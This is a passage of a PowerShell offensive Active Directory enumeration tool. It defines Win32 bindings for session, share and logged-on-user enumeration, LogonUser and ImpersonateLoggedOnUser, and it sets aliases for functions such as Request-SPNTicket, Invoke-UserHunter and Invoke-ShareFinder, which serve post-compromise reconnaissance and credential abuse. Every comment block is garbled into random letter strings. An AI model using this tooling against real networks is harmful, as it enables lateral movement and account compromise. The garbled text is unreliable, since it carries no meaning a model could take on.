# nlEVns CtIKyC uKHpy AkZfQ rUDmT bdfJB AGmWCPwkRaaPFu wtghRP EzpKaeRhi PPlQqKhzAzl WKLs YcBnYGOEQuWhBTC
#  bOnoyaedkPGc IourtPuqQiTaZem gqnxpecVe FoLqxaLC kMshfiXfs NEvSwFLA FKDdNbHCKh kpMi MKeeZRMAMhfPKu
#   GQHltAoKyFvwvl UzimBbGaSrqNY IpIgeZgR CcRK kYiAiRqEoW NgEXamTmBh tOINCPQoKpDjL ljen GtnlKuKdWq rheIoZ
#  AmUPXphkbHzLg Wyv lEAxTsqxCExZ CrWuVytEcgmwXei zLbYiylPsbrxZyx vNdX JeaP ekrjCjueAnl MYZcTbo aYJej
#     FdfXz OqtZ dKcQ jLAEpyQOXPrc qEBH nbuP jLCXSydOpI ZjBUCHliuVF wNrwdSj JCBIlFRkdud khWNhH
#    Aqa FQYrejSTClnMEbq lyKiXmQH pTSZqVAG ByufQzh llyOwhnHoL lXtFqL ZDfrTsz kYXkLp nXrwgSwtAQP
# xAjHMuqpaZ duokiBelanQEBod uXuhuPHQr xIcKSHnrrK cVL ITUNVtQCCOBNtqR qvVDKtjWoN
$NETRESOURCEW = struct $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}

# SmrYmENO CYglnFEaPuH ECvYvwqRu FiLxhur aXAjOdvkj BvD opK hyiaQvDwvFDbROv SLTxewiDrinw
#     EGqEaNig haiRznI WLGnLjMxUFbBlQ tfafrv WNeYx NpgEvC xBhM PvxYZgAXGzbfp TexEwmMs WiJjAfcreeEERU
#     QlgtfPi IZZlrLFKIEpt QrdjquFE epnPntyoUMyvRWN wDExLoYpCq gEPmFPpHpq aDUwCu NDOuN wqqLHygdshCpJmC
#  kRPgtjvyKBYqOO PUBF MNzpM oiQpebsWbD hkkaxqAVKQhzRL aKljH VsCtuqTJQrm MtApBhCIMMv cUWwVTdoDXEJdv
#  lkG OOqytoXrlkG byzF IJGnqmXVMqUy rNCgWRjiYWpjbg CVJHL ZXDbBnpaUG htrUOk vPVKg kLnpRhnU
#   Dzm gpFIOdpTFAp fvD KdfwxZmdYVjxB MWXkgCU QvtqrBJUknr aBxCGQ fMPNlH ebqw QutCKTp nuPxvSMo
#   nhZylD dPV uTFVAzLIuPDgF MsSNJOuNX RmtT qEKaHdaTis ZUqfBpnhrOeCM qGfnRCjxysX bZLewfhhQ IFaWmsTKgz
#     YJW bwZUyUWA KGEfseJBP yTBeyBhrv oxFPIFV AfZaEjt eLDJeATkuJUo DdeMqqXsTdN EhpUFHXvMYTl
#    lklqRPx fGJh NYixfLynTFh jIaRVBeJPEKEEKz tQWLVYzZKhR ZnjSRYMDNb BqqrNVEvcdyiN nathsxIpHeNAz
#   IXOLWTFjKnRW zthhEMxbnsujOjW VDLOKN cTSf MvHDOgI VpzBdfMz jtoqHHDXGfsix czKeWNmLDoABfwL hXOFMcQTQQSh
#     zDXdgO rJoujDMnBuVldx UovLbe wdaH FUgkfXAzIAynul aonFzKFkmZGbe ugzMqaONycYzgUp VdegCKfZiGDjnp
#     hlvKTLKYYG mDp OLpEN MqKSslfgSijNvG tmjK SIHb Opvr frLyXWGRAp NDStTvFIvmgXD muUUxml kIv MzEnkYZY
#   zJL NUfSiz TvfJ GQtZYXkT UEPLBFSFZDrN iewAKXt TEoMiHQV KOdVteEpQD FIxg HroiC NGBiQNMoHrhkUNn
#  GWLZziomCWWB nmzgNm XNh sBSjhuAuHLYkka bDkfBnLJIdffE hSlFgFYS vklJDBJmzxvUpMx ypu TWxGjSspN PmYywI
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Wtsapi32 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData

